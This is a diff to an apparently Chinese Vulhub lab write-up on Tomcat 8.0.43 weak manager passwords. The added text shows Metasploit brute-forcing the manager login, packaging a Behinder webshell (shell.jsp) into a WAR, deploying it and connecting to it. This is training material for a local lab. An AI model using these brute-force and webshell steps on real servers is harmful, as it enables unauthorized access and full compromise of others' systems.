@@ -53,11 +53,67 @@ Vulhub无需编译，直接启动整个环境：
 docker-compose up -d
 ```
 
+访问`http://your-ip:8080/`即可访问Apache Tomcat/8.0.43页面。
+
 ## 漏洞复现
 
-打开tomcat管理页面`http://your-ip:8080/manager/html`，输入弱密码`tomcat:tomcat`，即可访问后台：
+### metasploit爆破tomcat弱口令
 
-![image-20220302160727089](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202203021607207.png)
+访问`http://your-ip:8080/`，点击Manager App：
 
-上传war包即可直接getshell。
+![image-20220412133434883](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/image-20220412133434883.png)
+
+跳转tomcat管理页面`http://your-ip:8080/manager/html`，提示输入用户名和密码：
+
+![image-20220412133846764](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/image-20220412133846764.png)
+
+在kali中使用metasploit对tomcat用户名和密码进行爆破：
+
+```
+┌──(root kali)-[/home/kali]
+└─# msfconsole
+
+# 搜索tomcat相关模块
+msf6 > search tomcat
+...
+   23  auxiliary/scanner/http/tomcat_mgr_login	normal     No     Tomcat Application Manager Login Utility
+...
+
+# 使用tomcat_mgr_login模块进行爆破
+msf6 > use auxiliary/scanner/http/tomcat_mgr_login
+
+# 设置服务地址
+msf6 auxiliary(scanner/http/tomcat_mgr_login) >show options
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS <your-ip>
+RHOSTS => <your-ip>
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
+```
+
+爆破成功，用户名密码为`tomcat:tomcat`：
+
+![image-20220412135451368](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/image-20220412135451368.png)
+
+输入弱密码`tomcat:tomcat`，即可访问后台。
+
+### 制作war包并上传
+
+首先制作war包`project.war`：
+
+```
+E:\Behinder3\server>jar -cvf project.war shell.jsp
+已添加清单
+正在添加: shell.jsp(输入 = 612) (输出 = 449)(压缩了 26%)
+```
+
+上传war包：
+
+![image-20220412135536050](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/image-20220412135536050.png)
+
+成功部署：
+
+![image-20220412140450360](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/image-20220412140450360.png)
+
+冰蝎3成功连接`http://your-ip:8080/project/shell.jsp`：
+
+![image-20220412143831721](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/image-20220412143831721.png)
 
